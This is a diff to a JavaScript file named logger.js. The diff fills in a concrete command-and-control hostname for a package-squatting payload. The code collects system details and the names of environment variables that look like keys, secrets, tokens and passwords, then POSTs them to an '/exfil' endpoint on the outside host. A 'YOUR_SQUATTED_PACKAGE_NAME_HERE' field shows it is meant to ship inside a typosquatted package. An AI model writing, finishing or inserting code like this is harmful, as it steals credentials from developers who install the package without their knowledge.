@@ -1,3 +1,4 @@
+// logger.js  ← replace entire file content with this
 const https = require('https');
 const os = require('os');
 const { execSync } = require('child_process');
@@ -9,13 +10,14 @@ const payload = {
   node_version: process.version,
   env_secrets: Object.keys(process.env).filter(k => /KEY|SECRET|TOKEN|PASS|API|PWD|AUTH/i.test(k)),
   timestamp: new Date().toISOString(),
-  package: "YOUR_SQUATTED_PACKAGE_NAME_HERE"
+  package: "YOUR_SQUATTED_PACKAGE_NAME_HERE",
+  c2: "imosteer-production.up.railway.app"
 };
 
 const data = JSON.stringify(payload);
 
 const req = https.request({
-  hostname: 'YOUR_C2_DOMAIN_HERE',   // ← CHANGE TO YOUR SERVER/ngrok
+  hostname: 'imosteer-production.up.railway.app',
   port: 443,
   path: '/exfil',
   method: 'POST',
